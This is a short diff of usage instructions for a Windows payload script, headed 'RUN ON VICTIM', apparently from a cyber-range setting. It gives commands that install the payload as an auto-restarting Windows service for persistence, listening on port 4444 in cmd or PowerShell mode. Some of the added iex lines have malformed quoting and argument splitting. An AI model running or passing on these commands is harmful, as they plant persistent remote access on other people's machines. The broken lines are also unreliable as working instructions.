@@ -4,11 +4,11 @@ USAGE INSTRUCTIONS (RUN ON VICTIM)
 # Default installation (Port 4444, cmd mode, ONSTART trigger)
 python win_payload.py
 
-# Install Persistance
-python winpayload.py --install
+# Install as Windows Service (Auto-Restart)
+iex "& { & 'C:\Users\cyberrange\Downloads\DC_Payload.py' '--install --port 4444 --mode cmd' }"
 
 # PowerShell mode
-python win_payload.py --mode powershell
+iex "& { & 'C:\Users\cyberrange\Downloads\DC_Payload.py'; '--port 4444 --mode cmd' }"
 
 # Custom port (e.g. 8080)
 python win_payload.py --port 8080
